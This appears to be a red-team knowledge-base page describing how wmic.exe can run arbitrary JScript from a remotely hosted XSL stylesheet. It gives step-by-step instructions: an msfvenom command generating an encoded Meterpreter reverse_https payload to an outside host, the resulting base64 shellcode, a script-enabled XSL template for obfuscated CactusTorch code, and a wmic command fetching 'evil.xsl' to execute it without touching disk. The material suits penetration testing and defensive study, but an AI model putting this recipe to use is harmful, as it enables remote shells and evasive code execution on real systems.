<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
## wmic.exe

`wmic.exe`

### References
* LOLBAS Project: Wmic.exe -<br />[https://lolbas-project.github.io/lolbas/Binaries/Wmic/](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)

### Overview

Thanks to its built-in XSL-parsing capability, `wmic.exe` can be made to execute arbitrary JScript code (which can in turn execute shellcode).

* Requires .Net Framework 3.5 to be installed.

### Method 1: Using XSL + CactusTorch

1. Download the .js CactusTorch payload: <br />[https://github.com/mdsecactivebreach/CACTUSTORCH](https://github.com/mdsecactivebreach/CACTUSTORCH)
1. Generate a payload with msfvenom and encode it in base64:
```bash
msfvenom -e x86/fnstenv_mov -i 13 -f raw -p windows/meterpreter/reverse_https LHOST=pentest2.blacklanternsecurity.com LPORT=443 | base64 -w 0
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 13 iterations of x86/fnstenv_mov
x86/fnstenv_mov succeeded with size 522 (iteration=0)
...
x86/fnstenv_mov succeeded with size 811 (iteration=12)
x86/fnstenv_mov chosen with final size 811
Payload size: 811 bytes

Kcmxxdnu2XQk9FuBcxP6k6uhg+v84vTTWhoeI31y1d5n8CCJgMnFTwEoSgZxX/BXl4AacP9N52p9uLCNOruLEaXSP3zSFIhnGvyvD90BtY0oVlIUBG/0VULZoyJAQbrOsmbSF098UOIYm1u5KuyIiJdq/xh4eMjqXxAbF0WS7kCi9tI1ckqEz1M9e0cGq4lgbn50euyLI52vyPmANOGsbEM5W5Yiy3z+zTZmfDhhgYyQJ1OkUu5w0yPyFnPL1X6SNs/8Z2EoUUsEPCQN7tlTO3acL8lR9NQ0S3YhY6x7b3kHrkvsXdnHFmccLzEP4dIrjRSFzLjF9nhVfgo9IspvbvIiSAYF31KE8Ii1hMZ1YlyaB0QrQDFxwsSVXD/eF6loOY64xUnPw+fIuBZjdi/qi5SmD7o0S2HbxKS4h399/gCGB+U8vgnbdFgTi/f2A8pKOyLrTBbduNx/ffoAvhNhx+VXCcP1/rsArQ/rWH9m8mjOZmG/fy48uguDK0T5Li2zFFociInX0fbQWg7Tf3fOiidJYYe/pLKX9fxhj38uOgKwC87Qr06z0aXQCtSrdWGZH6K345pKnoucWIPlnXuCx4MJ7XQhHjHYp3y52JwVvPJT0D/Yp0Xp2KdHEav0LwKW9S/qpKVFrfyWaKbMgxyc8pBwpLmFSp35g0ikvMNoofKlYZrckkfbxaJmvsyeWaDdpmCu4753kM25VozTsnyZspBA3uSHQZ7ZomOMx5ccoKaNW5rig0O6up0W29SYQ7jtxWCL57VlpP+Tecfyu26I2qx3jL+lVYnhk3aru64cpsChG4f5p1u+zZxJkuq/H4jf9H+C3H2wLHQhpizYnC/Ya3B8udijfLzjH3rEsAv6fOH+cIILxy/qAhRF7tueMLzjgWl0DQv6udinfLzj2Sny8Av6b0uBO4ID5y/q47Df32sL+qX+Ocegi/QvgMucL/qL9Efqi7QvueOsi7luC/p52KemDdycL8qL9Hy84+a5Y2kL+m9LgOBhjPXsb0uByrJIq8eBdAvQ277NAdy+2h3YstoX2YtP318pokXq2Av6KBtxlaDmuQpvY6k5oQ==
```
1. Copy the base64 output and paste it into the CactusTorch script
1. Run the entire CactusTorch script through a Javascript obfuscator
1. Copy obfuscated code and paste it into the CDATA section of a script-enabled stylesheet:
```xml
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[

PASTE OBFUSCATED CACTUSTORCH CODE HERE

	]]> </ms:script>
</stylesheet>
```
1. Host `.xsl` file on web server with a valid SSL certificate
1. Run the following command to execute the payload without touching disk:
```cmd
wmic os get /format:"https://staging.blacklanternsecurity.com/evil.xsl"
```
**NOTE #1: For some unknown reason, this only works from cmd.exe and not from Powershell**
**NOTE #2: Also, the URL must use a hostname.**